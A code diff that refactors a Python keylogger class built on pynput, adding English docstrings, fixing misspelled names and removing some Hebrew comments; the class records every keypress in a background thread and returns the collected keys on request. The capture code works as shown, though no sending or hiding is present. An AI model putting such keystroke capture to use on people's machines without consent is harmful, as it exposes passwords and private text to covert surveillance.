@@ -5,6 +5,9 @@ import os
 
 
 class IKeyLogger(ABC):
+    """Abstract class for Interface KeyLogger
+    with start, stop, and get_logged_keys methods."""
+
     @abstractmethod
     def start_logging(self) -> None:
         pass
@@ -18,22 +21,23 @@ class IKeyLogger(ABC):
         pass
 
 
-# קלאס שאחראי על ההקלטה מפעיל הקלטה בהדלקה ראשונה
 class KeyLogger(IKeyLogger):
+    """KeyLogger class that handles the recording of keystrokes."""
 
     def __init__(self):
         self.arr = list()
-    # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
 
     def __on_press(self,Key):
-        key_nise = KeyLogger.nurmal_key(Key)
+        """Handle the event when a key is pressed."""
+        key_normalized = KeyLogger.normalize_key(Key)
         # print(key_nise)
         # לתקן את הדרך
-        self.arr.append(key_nise)
+        self.arr.append(key_normalized)
 
         # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
     @staticmethod
     def __on_release(key):
+        """Handle the event when a key is released."""
         try:
             if key.char == '\x04':  # Ctrl+D
                 print("Exiting...")
@@ -43,39 +47,43 @@ class KeyLogger(IKeyLogger):
 
     # אחראי ליפות את המקש
     @staticmethod
-    def nurmal_key(key):
-            key_nise = str(key)
-            key_list = list(key_nise)
+    def normalize_key(key):
+            """Normalize the key to a readable format."""
+            key_str = str(key)
+            key_list = list(key_str)
             if len(key_list) > 3:
-                key_nise = ""
+                key_str = ""
                 for i in key_list[4:]:
-                    key_nise += i
-                key_nise = " " + key_nise + " "
-                if key_nise == " space ":
+                    key_str += i
+                key_str = " " + key_str + " "
+                if key_str == " space ":
                     return " "
                 # if key_nise == " enter ":
                 #     return "\n"
                 # זה מוכן למקרה שהרצה לעשות שימוש במקשים מיוחדים
-                return key_nise
+                return key_str
             else:
                 return key_list[1]
 
     #  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
     def start_logging(self):
+        """Start logging keystrokes in a separate thread."""
         def _statr():
-            with Listener(on_press=self.__on_press, on_release=self.__on_release) as l:
-                self.lisiner = l
-                self.lisiner.join()
+            with Listener(on_press=self.__on_press, on_release=self.__on_release) as listener:
+                self.listener = listener
+                self.listener.join()
         ran = threading.Thread(target=_statr)
         ran.start()
 
     def stop_logging(self) -> None:
+        """Stop logging keystrokes."""
         os._exit(0)
 
     def get_logged_keys(self) -> list[str]:
-        c = self.arr.copy()
+        """Get the list of logged keys and reset the internal list."""
+        logged_keys = self.arr.copy()
         self.arr = []
-        return c
+        return logged_keys
 
 
 
